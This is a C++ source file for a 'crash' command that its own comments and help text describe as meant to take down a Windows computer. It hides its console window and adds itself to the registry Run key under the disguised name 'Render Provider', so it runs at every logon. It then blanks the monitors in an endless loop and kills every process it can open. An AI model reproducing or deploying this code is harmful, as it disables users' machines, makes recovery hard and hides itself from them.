#include "stdafx.h"
#include "CommandCrash.h"

CommandCrash::CommandCrash()
{
}

CommandCrash::~CommandCrash()
{
}

bool CommandCrash::shouldRunThisCommand(ParsedCommand* Parsed)
{
	return (Parsed->words->at(0) == "crash");
}

void CommandCrash::run(ParsedCommand* Parsed)
{
	//Hide the window, just to make all but the most experienced windows users frustrated.
	HWND console = GetConsoleWindow();
	ShowWindow(console, 0);

	//Register in startup, just to cause more damage.
	this->registerProgram();

	//Turn off the moniter(s)
	thread* moniter = new thread(&CommandCrash::turnOffMoniter, this);

	//Kill as many processes as possible, to free up resources, and reduce resistance.
	thread* processKiller = new thread(&CommandCrash::attackProcesses, this);
}

void CommandCrash::attackProcesses()
{
	WCHAR path[260];
	GetModuleFileName(NULL, path, 260);
	HWND console = FindWindow(L"ConsoleWindowClass", path);

	if (IsWindow(console))
	{
		ShowWindow(console, SW_HIDE);
	}

	// Get the list of process identifiers.  
	register unsigned long aProcesses[1024];
	unsigned long cbNeeded;
	unsigned long numberOfProcesses;

	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);

	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	register unsigned int i = 0;
	void* hProcess;
	unsigned long CID = GetCurrentProcessId();
	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
	i = 0;
	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	for (i = 0; i < numberOfProcesses; i++)
	{
		//Get process handle.
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, aProcesses[i]);
		void* info = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

		wchar_t buffer[MAX_PATH];
		GetModuleFileNameEx(info, NULL, buffer, MAX_PATH);
		wstring ws(buffer);
		string converted(ws.begin(), ws.end());

		char drive[4];
		char directory[MAX_PATH];
		char filename[MAX_PATH];
		char extension[MAX_PATH];
		_splitpath(converted.c_str(), drive, directory, filename, extension);

		//Make sure its not the host for this program.
		//We can't directly kill ourselves when not elevated, but we could kill something needed to run this program.
		if (filename[0] != 'C' || filename[1] != 'o' || filename[2] != 'm' || filename[3] != 'm'
			|| filename[4] != 'a' || filename[5] != 'n' || filename[6] != 'd'
			|| extension[0] != '.' || extension[1] != 'e' || extension[2] != 'x'
			|| extension[3] != 'e')
		{
			//Kill process.
			TerminateProcess(hProcess, 1);
		}
	}
}

void CommandCrash::turnOffMoniter()
{
	//https://www.codeproject.com/articles/11099/turn-on-off-monitor
	while (true)
	{
		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
	}
}

string* CommandCrash::getName()
{
	return new string("Crash");
}

string* CommandCrash::getHelp()
{
	return new string("Takes down your computer. Good luck getting it back without a hard shutdown.");
}

bool CommandCrash::isMyProgramRegisteredForStartup(wchar_t* pszAppName)
{
	HKEY hKey = NULL;
	long lResult = 0;
	bool fSuccess = true;
	unsigned long dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	unsigned long dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

bool CommandCrash::registerMyProgramForStartup(wchar_t* pszAppName, wchar_t* pathToExe, wchar_t* args)
{
	HKEY hKey = NULL;
	long lResult = 0;
	bool fSuccess = true;
	unsigned long dwSize;

	const unsigned __int64 count = MAX_PATH * 2;
	wchar_t szValue[count] = {};

	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (unsigned char*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void CommandCrash::registerProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	registerMyProgramForStartup(L"Render Provider", szPathToExe, L"crash");
}